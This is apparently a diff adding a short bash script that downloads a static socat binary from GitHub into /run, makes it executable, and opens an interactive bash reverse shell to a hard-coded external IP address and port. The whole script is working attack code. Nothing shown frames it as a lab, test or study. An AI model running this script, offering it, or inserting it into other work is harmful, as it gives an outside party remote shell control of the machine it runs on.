@@ -1,0 +1,7 @@
+#!/bin/bash
+
+wget -O /run/socat https://raw.githubusercontent.com/yuvalavra/serve/master/static_socat
+
+chmod +x /run/socat
+
+/run/socat "exec:bash -li,pty,stderr,setsid,sigint,sane" "tcp:54.219.245.49:13278"
